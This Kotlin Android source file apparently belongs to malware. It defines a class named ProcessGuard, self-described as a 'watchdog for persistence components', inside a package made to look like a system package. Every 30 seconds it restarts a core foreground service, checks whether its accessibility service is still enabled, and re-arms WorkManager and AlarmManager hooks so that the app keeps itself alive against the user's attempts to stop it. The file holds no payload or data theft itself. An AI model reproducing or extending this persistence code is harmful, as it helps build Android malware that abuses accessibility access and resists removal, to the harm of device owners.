// [context: Kotlin, Android API 26+, watchdog for persistence components]
package com.system.service.core

import android.app.ActivityManager
import android.app.AlarmManager
import android.content.Context
import android.content.Intent
import android.provider.Settings
import androidx.work.*
import kotlinx.coroutines.*

class ProcessGuard(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun startWatching() {
        scope.launch {
            while (isActive) {
                delay(30_000L)
                rebuildDeadComponents()
            }
        }
    }

    private fun rebuildDeadComponents() {
        if (!isCoreServiceRunning()) {
            context.startForegroundService(Intent(context, CoreService::class.java))
        }
        if (!isAccessibilityEnabled()) {
            WorkManagerHook(context).schedulePeriodicWork()
            AlarmManagerHook(context).scheduleAlarm()
        }
        ensureWorkManagerScheduled()
    }

    private fun isCoreServiceRunning(): Boolean {
        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        @Suppress("DEPRECATION")
        return am.getRunningServices(Int.MAX_VALUE).any {
            it.service.className == CoreService::class.java.name
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabledServices.contains(context.packageName)
    }

    private fun ensureWorkManagerScheduled() {
        val info = WorkManager.getInstance(context)
            .getWorkInfosByTag("guard")
            .get()
        if (info.isEmpty() || info.all { it.state.isFinished }) {
            WorkManagerHook(context).schedulePeriodicWork()
        }
    }

    fun stop() = scope.cancel()
}
